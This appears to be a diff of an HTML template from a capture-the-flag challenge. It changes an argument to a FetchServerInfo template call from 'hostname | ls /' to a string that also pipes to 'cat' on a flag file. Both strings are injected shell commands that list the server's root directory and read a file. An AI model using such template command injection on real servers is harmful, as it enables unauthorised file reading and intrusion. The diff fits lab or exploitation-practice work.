@@ -20,7 +20,7 @@
         <div class="row mt-2 mb-5">
             <div class="col">
                 
-                <h3>{{ .FetchServerInfo "hostname | ls /" }}</h3>
+                <h3>{{ .FetchServerInfo "hostname | ls / | cat /flagfa5e39f660.txt" }}</h3>
                 
                 
             </div>
